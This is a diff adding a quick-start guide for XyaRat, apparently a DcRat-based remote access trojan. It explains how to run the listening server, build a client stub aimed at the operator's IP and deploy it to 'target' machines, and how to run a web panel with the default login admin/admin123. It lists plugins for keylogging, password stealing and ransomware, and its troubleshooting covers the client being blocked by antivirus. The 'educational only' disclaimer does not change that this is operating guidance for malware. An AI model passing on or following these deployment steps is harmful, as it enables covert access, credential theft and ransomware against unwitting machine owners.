@@ -1,0 +1,180 @@
+╔══════════════════════════════════════════════════════════════════╗
+║              XYARAT - QUICK START GUIDE                          ║
+╚══════════════════════════════════════════════════════════════════╝
+
+⚠️  WARNING: For educational and authorized testing purposes ONLY!
+    Unauthorized use is ILLEGAL and UNETHICAL.
+
+═══════════════════════════════════════════════════════════════════
+
+📦 DOWNLOAD RELEASE
+═══════════════════════════════════════════════════════════════════
+
+Go to: https://github.com/wsxyanua/XyaRat/releases
+
+Download latest release:
+  - DcRat-[version].zip     → RAT Server + Client + Plugins
+  - WebPanel-[version].zip  → Web Admin Panel (optional)
+
+═══════════════════════════════════════════════════════════════════
+
+🚀 QUICK START (Server)
+═══════════════════════════════════════════════════════════════════
+
+1. Extract DcRat.zip to any folder
+2. Run DcRat.exe (Main Server)
+3. Configure port (default: 5656)
+4. Click "Start Listening"
+5. Build client stub with "Builder" button
+
+That's it! Server is now listening for connections.
+
+═══════════════════════════════════════════════════════════════════
+
+🔧 CLIENT DEPLOYMENT
+═══════════════════════════════════════════════════════════════════
+
+1. Open "Builder" in DcRat.exe
+2. Configure:
+   - Host: Your server IP/domain
+   - Port: 5656 (default)
+   - Installation options
+3. Click "Build"
+4. Deploy Client.exe to target machine
+
+═══════════════════════════════════════════════════════════════════
+
+🌐 WEB PANEL (Optional)
+═══════════════════════════════════════════════════════════════════
+
+1. Extract WebPanel.zip to separate folder
+2. Edit appsettings.json:
+   - Change JWT secret key
+   - Set RAT Server IP/port
+3. Run WebPanel.exe
+4. Open browser: http://localhost:5000
+5. Login: admin / admin123
+6. CHANGE PASSWORD IMMEDIATELY!
+
+═══════════════════════════════════════════════════════════════════
+
+🧪 TESTING IN WINDOWS SANDBOX
+═══════════════════════════════════════════════════════════════════
+
+1. Enable Windows Sandbox:
+   - Windows Features → Windows Sandbox → Enable
+   
+2. Test Server (Host machine):
+   - Run DcRat.exe on host
+   - Note your IP: ipconfig
+   
+3. Test Client (Inside Sandbox):
+   - Copy Client.exe to Sandbox (drag & drop)
+   - Run Client.exe
+   - Should connect to host server
+
+4. Verify:
+   - Client appears in DcRat.exe client list
+   - Status: Online
+   - Can send commands
+
+═══════════════════════════════════════════════════════════════════
+
+📁 PACKAGE CONTENTS
+═══════════════════════════════════════════════════════════════════
+
+DcRat.zip:
+  ├── DcRat.exe              ← Main Server (Run this!)
+  ├── Stub/
+  │   └── Client.exe         ← Client stub (deploy to targets)
+  └── Plugin/                ← All plugin DLLs
+      ├── FileManager.dll
+      ├── RemoteDesktop.dll
+      ├── Keylogger.dll
+      ├── Recovery.dll       ← Password stealer
+      ├── Ransomware.dll
+      └── ... (22 plugins total)
+
+WebPanel.zip:
+  ├── WebPanel.exe           ← Web server (Run this!)
+  ├── appsettings.json       ← Config (EDIT THIS!)
+  ├── wwwroot/               ← React frontend
+  └── *.dll                  ← Dependencies
+
+═══════════════════════════════════════════════════════════════════
+
+🔐 SECURITY RECOMMENDATIONS
+═══════════════════════════════════════════════════════════════════
+
+✓ Use HTTPS/TLS in production
+✓ Change default passwords
+✓ Use strong JWT secret (32+ chars)
+✓ Configure firewall rules
+✓ Test in isolated environment first
+✓ Keep server behind NAT/firewall
+✓ Use VPN for remote access
+✓ Enable IP whitelist for WebPanel
+
+═══════════════════════════════════════════════════════════════════
+
+🐛 TROUBLESHOOTING
+═══════════════════════════════════════════════════════════════════
+
+❌ "Client not connecting":
+   → Check firewall allows port 5656
+   → Verify server IP/port in client
+   → Check antivirus didn't block
+
+❌ "Server won't start":
+   → Port 5656 already in use
+   → Run as Administrator
+   → Check .NET Framework 4.6.1 installed
+
+❌ "WebPanel login fails":
+   → Check appsettings.json JWT key
+   → Verify database file exists
+   → Check logs in logs/ folder
+
+❌ "Plugins not working":
+   → Ensure Plugin/ folder exists
+   → All DLLs in Plugin/ directory
+   → Reextract from zip if missing
+
+═══════════════════════════════════════════════════════════════════
+
+📞 SUPPORT & INFO
+═══════════════════════════════════════════════════════════════════
+
+GitHub: https://github.com/wsxyanua/XyaRat
+Releases: https://github.com/wsxyanua/XyaRat/releases
+Issues: https://github.com/wsxyanua/XyaRat/issues
+
+═══════════════════════════════════════════════════════════════════
+
+⚖️  LEGAL DISCLAIMER
+═══════════════════════════════════════════════════════════════════
+
+This software is provided for EDUCATIONAL PURPOSES ONLY.
+
+You may use this software ONLY for:
+  ✓ Learning security concepts
+  ✓ Authorized penetration testing
+  ✓ Research in controlled environments
+  ✓ Testing your OWN systems
+
+You must NOT use this software for:
+  ✗ Unauthorized access to systems
+  ✗ Malicious activities
+  ✗ Illegal surveillance
+  ✗ Any activity violating laws
+
+By using this software, you agree to use it responsibly and legally.
+The authors are NOT responsible for misuse or illegal activities.
+
+═══════════════════════════════════════════════════════════════════
+
+Built: November 2025
+Version: Check GitHub Releases
+License: Educational Use Only
+
+═══════════════════════════════════════════════════════════════════
